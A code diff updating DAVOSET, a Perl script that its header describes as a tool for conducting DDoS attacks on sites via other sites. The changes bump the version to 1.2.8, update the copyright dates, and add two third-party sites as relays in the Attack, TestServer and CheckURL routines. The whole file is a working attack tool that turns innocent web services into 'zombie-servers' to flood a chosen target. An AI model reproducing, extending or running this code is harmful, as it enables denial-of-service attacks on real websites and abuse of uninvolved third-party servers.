@@ -1,13 +1,13 @@
 #!/usr/bin/perl
 # DDoS attacks via other sites execution tool
-# DAVOSET v.1.2.7
+# DAVOSET v.1.2.8
 # Tool for conducting of DDoS attacks on the sites via other sites
-# Copyright (C) MustLive 2010-2015
-# Last update: 30.11.2015
+# Copyright (C) MustLive 2010-2016
+# Last update: 26.03.2016
 # http://websecurity.com.ua
 #############################################
 # Settings
-my $version = "1.2.7"; # program version
+my $version = "1.2.8"; # program version
 my $agent = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1)"; # user agent
 my $default_port = "80"; # default port of the host
 my $show_stat = 1; # show statistic of work
@@ -152,7 +152,7 @@ sub Info { # info
 	print qq~
 DDoS attacks via other sites execution tool
 DAVOSET v.$version
-Copyright (C) MustLive 2010-2015
+Copyright (C) MustLive 2010-2016
 
 ~;
 }
@@ -169,6 +169,7 @@ sub Attack { # send request to zombie-server
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
 	$site = "http://$site" if ($site !~ /^https?:/ && CheckURL($url));
+	$site =~ s|://|/| if ($url =~ /proxy2974.my-addr.org/);
 	if ($cache) {
 		$site .= "/" if ($site !~ /\/$/);
 		if ($site =~ /\?/ || $site =~ /%3F/) {
@@ -314,6 +315,7 @@ sub TestServer { # test zombie-server
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
 	$site = "http://$site" if ($site !~ /^https?:/ && CheckURL($url));
+	$site =~ s|://|/| if ($url =~ /proxy2974.my-addr.org/);
 	if ($cache) {
 		$site .= "/" if ($site !~ /\/$/);
 		if ($site =~ /\?/ || $site =~ /%3F/) {
@@ -504,6 +506,8 @@ sub CheckURL { # web sites which require "http" for target URL
 	return 1 if ($url =~ m|^http://anonymouse.org|);
 	return 1 if ($url =~ m|^http://validator.w3.org|);
 	return 1 if ($url =~ m|^http://www.netvibes.com|);
-	return 1 if ($url =~ m|^http://services.w3.org|);	
+	return 1 if ($url =~ m|^http://services.w3.org|);
+	return 1 if ($url =~ m|^http://proxy2974.my-addr.org|);
+	return 1 if ($url =~ m|^http://dacd.win|);
 	return 0;
 }
